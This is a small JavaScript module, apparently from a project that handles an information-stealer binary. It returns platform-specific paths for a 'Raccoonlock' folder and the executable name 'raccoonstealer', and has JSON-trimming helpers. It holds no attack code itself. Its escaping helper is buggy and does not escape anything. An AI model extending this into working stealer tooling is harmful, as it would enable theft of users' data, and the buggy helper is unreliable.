class interfaces{
	constructor(platform){
		this.platform = platform;
	}

	getPath(){
		if (this.platform === "win32"){
			const path = `${process.env.LOCALAPPDATA}\\Raccoonlock`;
			return path;
		}else if(this.platform === "linux"){
			const os = require("os");
			const path = `${os.homedir()}/.raccoonlock`;
			return path;
		}
	}

	getStealer(){
		if (this.platform === "win32"){
			return 'raccoonstealer.exe';
		}else if(this.platform === "linux"){
			return './raccoonstealer';
		}
	}

	getCorrectJSON(string){
		let last = string.lastIndexOf('}');
		if (last !== -1) {
			const jsonOnly = string.substring(0, last + 1);
			return jsonOnly;
		}else{
			return "Invalid JSON string";
		}
	}

	makeCorrectJSON(string){
		let newString = string.replaceAll(`"`, `\"`);
		newString = string.replaceAll(`$`, `\$`);
		return newString;
	}
}

module.exports = interfaces;
